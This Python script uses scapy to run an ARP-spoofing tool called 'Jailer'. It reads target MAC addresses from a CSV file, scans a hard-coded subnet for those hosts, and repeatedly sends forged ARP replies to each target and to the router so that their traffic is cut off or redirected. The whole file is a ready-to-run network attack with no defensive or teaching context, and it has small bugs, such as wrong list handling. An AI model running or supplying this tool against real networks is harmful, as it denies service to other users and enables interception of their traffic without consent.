import os
import sys
from scapy.all import*
import csv
import re
import ipaddress

class Jailer:
    all_computer = "ff:ff:ff:ff:ff:ff"

    def __init__(self, initIP, cidr, routerIP, interval=300):
        self.initIP = initIP
        self.cidr = cidr
        self.routerIP = routerIP
        self.interval = interval
        self.blacklist = self.getBlacklist()
        
    @staticmethod
    def getBlacklist():
        blacklist = []

        with open("jail.csv",newline="") as f:
            reader = csv.reader(f)
            for row in reader:
                blacklist.append(row[0])

        return blacklist 

    @staticmethod
    def getTime():
        return time.strftime("%H:%M:%S", time.localtime())

    def jail(self):
        router = {"ip":self.routerIP,"mac":self.findMAC(self.routerIP)}
        found, not_found, time_elapsed = self.findIP(self.blacklist)
        print(f"{self.getTime()} >>> {len(found)} found in {time_elapsed:.2f}s")

        while 1:
            try:
                # nothing found
                if len(found) == 0:
                    print(f"{self.getTime()} >>> no target, trying again in {self.interval/60:.0f} minutes... ")
                    time.sleep(self.interval)
                    found, not_found, time_elapsed = self.findIP(self.blacklist)
                    print(f"{self.getTime()} >>> {len(found)} found in {time_elapsed:.2f}s")
                # handle not found in interval
                elif len(not_found) != 0 and int(time.time()) % self.interval == 0:
                    print(f"{self.getTime()} >>> research targets...")
                    found_temp, not_found, time_elapsed = self.findIP(not_found)
                    for _ in found_temp:
                        found.append(found_temp)
                    print(f"{self.getTime()} >>> {len(found)} found in {time_elapsed:.2f}s")
                
                # found case
                for _ in found:
                    if self.isAlive(_):
                        self.spoof(router, _)
                    else:
                        print("{} >>> {} goes offline".format(self.getTime(), _.get("ip")))
                        found.remove(_)
                    time.sleep(1)
                    
            except KeyboardInterrupt:
                print("======= unjailed! ========")
                sys.exit()

    def findIP(self, MAC):
        start = time.time()
        not_found = MAC
        found = list()

        ans, unans = srp(Ether(dst=Jailer.all_computer)/ARP(pdst=self.initIP+"/"+self.cidr),timeout=2, verbose=False)
        for s,r in ans:
            for _ in MAC:
                mac_temp = r[Ether].src
                if mac_temp == _:
                    not_found.remove(mac_temp)
                    found.append({"ip":r[Ether].psrc, "mac":mac_temp})
        
        end = time.time()
        time_elapsed = end - start
        return found, not_found, time_elapsed

    @staticmethod
    def findMAC(IP):
        ans, unans = arping(IP, verbose=False)
        for s, r in ans:
            return r[Ether].src

    @staticmethod
    def isValidMAC(mac):
        mac_regx = re.compile(r'^([0-9A-F]{1,2})' + '\:([0-9A-F]{1,2})'*5 + '$', re.IGNORECASE)

        if mac_regx.match(mac):
            return True
        else:
            return False

    @staticmethod
    def isValidIP(IP):
        try: 
            ipaddress.ip_address(IP)
            return True
        except ValueError:
            return False

    @staticmethod
    def isAlive(victim):
        ans, unans = arping(victim.get("ip"), verbose=False)
        if len(ans) and victim.get("mac") == ans[0][1][Ether].src:
            return True
        else:
            return False

    @staticmethod
    def spoof(router, victim):
        # router = {"ip":"", "mac":""}

        if victim.get("mac"):
            send(ARP(op =2, pdst = victim.get("ip"), psrc = router.get("ip"), hwdst = victim.get("mac")), verbose=False)
            # if time.time() % 5 == 0:
            #     print(victim.get("mac"))
            send(ARP(op = 2, pdst = router.get("ip"), psrc = victim.get("ip"), hwdst = router.get("mac")), verbose=False)


if __name__ == "__main__":
    routerIP = "10.2.255.254"
    initIP = "10.2.1.0"
    cidr="24"
    interval = 60

    # jail(routerIP, interval)
    j = Jailer(initIP, cidr, routerIP, interval)
    j.jail()
        

